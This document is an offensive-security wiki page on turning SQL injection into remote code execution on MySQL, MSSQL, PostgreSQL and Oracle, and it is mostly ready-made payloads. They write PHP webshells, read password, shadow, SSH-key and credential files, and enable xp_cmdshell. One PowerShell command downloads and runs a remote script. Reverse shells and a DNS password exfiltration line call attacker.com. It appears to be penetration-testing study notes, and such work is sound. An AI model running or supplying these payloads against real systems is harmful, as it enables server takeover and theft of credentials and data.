# SQL Injection to RCE

← [[SQLi-Overview]]

---

SQLi usually means data theft. But in certain configurations, you can escalate from SQLi to full Remote Code Execution on the server.

---

## MySQL — INTO OUTFILE (File Write)

If the MySQL user has the `FILE` privilege and the web root is writable, you can write a webshell.

```sql
-- Write a PHP webshell to the web root
' UNION SELECT "<?php system($_GET['cmd']); ?>", NULL 
  INTO OUTFILE '/var/www/html/shell.php'--

-- Now use it:
https://example.com/shell.php?cmd=whoami
https://example.com/shell.php?cmd=cat+/etc/passwd
```

**Requirements:**
- MySQL `FILE` privilege (`SHOW GRANTS` shows `GRANT FILE`)
- `secure_file_priv` must allow the target path (check with `SELECT @@secure_file_priv`)
- Web server write access to the directory
- You know the web root path

**Finding the web root via error messages or:**
```sql
-- PHP config leak
' UNION SELECT LOAD_FILE('/etc/php/7.4/apache2/php.ini'), NULL--

-- Common web roots to try
/var/www/html/
/var/www/
/srv/http/
/usr/share/nginx/html/
```

---

## MySQL — LOAD_FILE (File Read)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--
' UNION SELECT LOAD_FILE('/etc/shadow'), NULL--      ← needs root
' UNION SELECT LOAD_FILE('/var/www/html/config.php'), NULL--   ← app source + DB creds
' UNION SELECT LOAD_FILE('/home/ubuntu/.ssh/id_rsa'), NULL--   ← SSH key
```

---

## MSSQL — xp_cmdshell (Direct OS Command Execution)

`xp_cmdshell` is a stored procedure that executes OS commands directly. Disabled by default since SQL Server 2005, but can be re-enabled if you have sysadmin privileges.

```sql
-- Check if it's enabled
'; EXEC xp_cmdshell('whoami');--

-- Enable it (requires sysadmin)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- Execute commands
'; EXEC xp_cmdshell('whoami');--
'; EXEC xp_cmdshell('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"');--

-- Reverse shell
'; EXEC xp_cmdshell('powershell -nop -w hidden -c "$client = New-Object Net.Sockets.TCPClient(''attacker.com'',4444);..."');--
```

**Check current privileges:**
```sql
'; SELECT IS_SRVROLEMEMBER('sysadmin');--
-- Returns 1 if sysadmin
```

---

## MSSQL — OLE Automation (Alternative to xp_cmdshell)

If `xp_cmdshell` is disabled and can't be re-enabled:

```sql
'; DECLARE @shell INT; 
   EXEC sp_oacreate 'wscript.shell', @shell OUTPUT; 
   EXEC sp_oamethod @shell, 'run', null, 'whoami > C:\temp\out.txt';--
```

---

## PostgreSQL — COPY FROM PROGRAM (PostgreSQL 9.3+)

```sql
-- Execute OS commands via COPY
'; COPY cmd_exec FROM PROGRAM 'id';--

-- Full workflow:
'; CREATE TABLE cmd_exec(cmd_output text);--
'; COPY cmd_exec FROM PROGRAM 'id';--
'; SELECT * FROM cmd_exec;--
'; DROP TABLE cmd_exec;--

-- Reverse shell
'; COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1';--
```

**Requirements:** Superuser or `pg_execute_server_program` role (PostgreSQL 11+)

---

## PostgreSQL — Large Object Write

Write a file using large objects (alternative if COPY is restricted):

```sql
'; SELECT lo_from_bytea(10, '<?php system($_GET[cmd]); ?>');--
'; SELECT lo_export(10, '/var/www/html/shell.php');--
'; SELECT lo_unlink(10);--
```

---

## Oracle — Java Stored Procedures

Oracle supports Java in the database. With DBA privileges:

```sql
-- Create Java class that executes OS commands
'; CREATE AND COMPILE JAVA SOURCE NAMED "exec" AS
  import java.lang.*;
  import java.io.*;
  public class exec {
    public static String run(String cmd) throws Exception {
      Runtime rt = Runtime.getRuntime();
      Process pr = rt.exec(cmd);
      BufferedReader stdInput = new BufferedReader(new InputStreamReader(pr.getInputStream()));
      String s = ""; String line;
      while ((line = stdInput.readLine()) != null) s += line;
      return s;
    }
  };--

'; CREATE OR REPLACE FUNCTION exec(p_cmd IN VARCHAR2) RETURN VARCHAR2
  AS LANGUAGE JAVA NAME 'exec.run(java.lang.String) return java.lang.String';--

'; SELECT exec('id') FROM dual;--
```

---

## SSRF via SQLi

Sometimes you can make the database server initiate outbound connections — useful for internal network pivoting or confirming blind SQLi via DNS.

```sql
-- MySQL DNS exfil (Windows MySQL)
' AND LOAD_FILE(concat('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--

-- MSSQL DNS lookup
'; EXEC master..xp_dirtree '\\'+@@version+'.attacker.com\a'--

-- PostgreSQL
'; SELECT dblink_connect('host=attacker.com');--
```

---

## Escalation Chain

```
SQLi confirmed
    ↓
Identify DB type and version
    ↓
Check privileges (DBA? FILE? sysadmin?)
    ↓
MySQL + FILE priv → write webshell
MSSQL + sysadmin → xp_cmdshell
PostgreSQL + superuser → COPY FROM PROGRAM
    ↓
OS command execution
    ↓
Reverse shell → full server access
```

---

*Back to [[SQLi-Overview]] | Related: [[Error-Based-SQLi]] | [[Blind-SQLi]]*

*Sources: PortSwigger Web Security Academy, PayloadsAllTheThings*
